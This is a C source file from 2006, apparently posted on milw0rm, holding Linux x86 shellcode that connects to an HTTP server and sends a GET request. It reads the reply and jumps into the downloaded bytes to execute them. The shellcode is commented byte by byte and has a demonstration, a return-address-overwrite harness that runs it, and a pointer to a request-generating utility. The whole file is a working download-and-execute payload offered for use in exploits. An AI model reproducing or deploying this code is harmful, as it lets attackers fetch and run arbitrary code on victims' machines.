/* (linux/x86) HTTP/1.x GET, Downloads and JMP - 68 bytes+
 *
 * This shellcode allows you to download a binary code straight off a standard HTTP server
 * and execute it. The downloaded shellcode (e.g. binary code) will be executed on the stack.
 *
 * <DEMONSTRATION>:
 *
 * > Starting by creating a very simple shellcode, that will be downloaded and execute.
 *
 * root@magicbox:/tmp# cat foobar.s
 *	.section .text
 *      .global _start
 *      _start:
 *
 *		movl $0x4, %eax
 *              movl $0x1, %ebx
 *
 *              call _doint
 *                      .ascii "Hello World!"
 *			.byte 0xa
 *              _doint:
 *              popl %ecx
 *              movl $0xd, %edx
 *              int $0x80
 *
 *              movl $0x1, %eax
 *              int $0x80
 *
 *		# Reverse CALL
 *              call _start
 *
 * > The only requirement from the downloaded shellcode, is that it will include a reverse
 *   CALL to itself. As this shellcode does not parse the HTTP header, it has no way to know
 *   where the downloaded shellcode begins or ends. Therefor it realys on the downloaded
 *   shellcode to supply that, by including a CALL in the bottom, which will be JMP into.
 *
 * > Compile the given shellcode
 *
 * root@magicbox:/tmp# as -o foobar.o foobar.s
 * root@magicbox:/tmp# ld -o foobar foobar.o
 *
 * > Convert this file into a raw binary (headerless, formatless)
 *
 * root@magicbox:/tmp# objcopy -O binary foobar foobar.bin
 *
 * > Host this file, on some HTTP server (I haved used Apache/1.3.34)
 *
 * > Use gen_httpreq.c to generate a URL request (e.g. /foobar.bin)
 *
 * > Paste the gen_httpreq.c output, into this shellcode at the marked place.
 *
 * > Compile this shellcode w/ the gen_httpreq output in it.
 *
 * > Execute this shellcode
 *
 * root@magicbox:/tmp# gcc -o http-download-jmp http-download-jmp.c
 * root@magicbox:/tmp# ./http-download-jmp
 * Hello World!
 * root@magicbox:/tmp#
 *
 * <LINKS/UTILITIES>:
 *
 *      gen_httpreq.c, generates a HTTP GET request for this shellcode
 *      > http://www.tty64.org/shellcode/utilities/gen_httpreq.c
 *
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	"\x6a\x66"              // push $0x66
	"\x58"                  // pop %eax
	"\x99"                  // cltd
	"\x6a\x01"              // push $0x1
	"\x5b"                  // pop %ebx
	"\x52"                  // push %edx
	"\x53"                  // push %ebx
	"\x6a\x02"              // push $0x2
	"\x89\xe1"              // mov %esp,%ecx
	"\xcd\x80"              // int $0x80
	"\x5b"                  // pop %ebx
	"\x5d"                  // pop %ebp

				//
	"\xbe\x80\xff\xff\xfe"  // mov $0xfeffff80,%esi
				// (0x0xfeffff80 = ~127.0.0.1)
				//

				//
	"\x66\xbd\x91\x1f"      // mov $0x1f91,%bp
				// (0x1f91 = 8081/tcp)
				//

	//
	// "\x66\xbd\xaf\xff"	// mov $0xffaf, %bp
	//			// (0xafff = ~0080/tcp)
	// "\x66\xf7\xd5"       // not %bp
	//

	"\xf7\xd6"              // not %esi
	"\x56"                  // push %esi
	"\x0f\xcd"              // bswap %ebp
	"\x09\xdd"              // or %ebx,%ebp
	"\x55"                  // push %ebp
	"\x43"                  // inc %ebx
	"\x6a\x10"              // push $0x10
	"\x51"                  // push %ecx
	"\x50"                  // push %eax
	"\xb0\x66"              // mov $0x66,%al
	"\x89\xe1"              // mov %esp,%ecx
	"\xcd\x80"              // int $0x80

	//
	// <paste here the code, that gen_httpreq.c outputs!>
	//

	"\x89\xe1"              // mov %esp,%ecx
	"\xb0\x04"              // mov $0x4,%al
	"\xcd\x80"              // int $0x80

	//
	// <_recv_http_request>:
	//

	"\xb0\x03"              // mov $0x3,%al
	"\x6a\x01"              // push $0x1
	"\x5a"                  // pop %edx
	"\xcd\x80"              // int $0x80
	"\x41"                  // inc %ecx
	"\x85\xc0"              // test %eax,%eax
	"\x75\xf4"              // jne <_recv_http_request>
	"\x83\xe9\x06"          // sub $0x6,%ecx
	"\xff\xe1";             // jmp *%ecx

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-03-12]